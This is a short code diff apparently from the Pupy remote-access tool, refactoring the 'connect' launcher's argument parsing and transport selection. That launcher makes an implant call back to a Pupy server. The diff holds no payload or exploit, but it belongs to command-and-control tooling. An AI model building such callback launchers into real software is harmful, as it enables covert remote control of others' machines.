@@ -22,14 +22,15 @@ class ConnectLauncher(BaseLauncher):
         self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
         super(ConnectLauncher, self).__init__(*args, **kwargs)
 
-    def init_argparse(self):
-        self.arg_parser = LauncherArgumentParser(prog="connect", description=self.__doc__)
-        self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, action='append', help='host:port of the pupy server to connect to. You can provide multiple --host arguments to attempt to connect to multiple IPs')
-        self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
-        self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = LauncherArgumentParser(prog="connect", description=cls.__doc__)
+        cls.arg_parser.add_argument('--host', metavar='<host:port>', required=True, action='append', help='host:port of the pupy server to connect to. You can provide multiple --host arguments to attempt to connect to multiple IPs')
+        cls.arg_parser.add_argument('-t', '--transport', choices=cls.transports, default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
+        cls.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
 
     def parse_args(self, args):
-        self.args=self.arg_parser.parse_args(args)
+        self.args = self.arg_parser.parse_args(args)
         self.rhost, self.rport=None,None
         self.parse_host(self.args.host[0])
 
@@ -52,7 +53,7 @@ class ConnectLauncher(BaseLauncher):
                 logging.info("connecting to %s:%s using transport %s ..."%(
                     self.rhost, self.rport, self.args.transport))
                 opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
-                t=network.conf.transports[self.args.transport](bind_payload=self.connect_on_bind_payload)
+                t=self.transports[self.args.transport](bind_payload=self.connect_on_bind_payload)
                 client_args=t.client_kwargs
                 transport_args=t.client_transport_kwargs
 
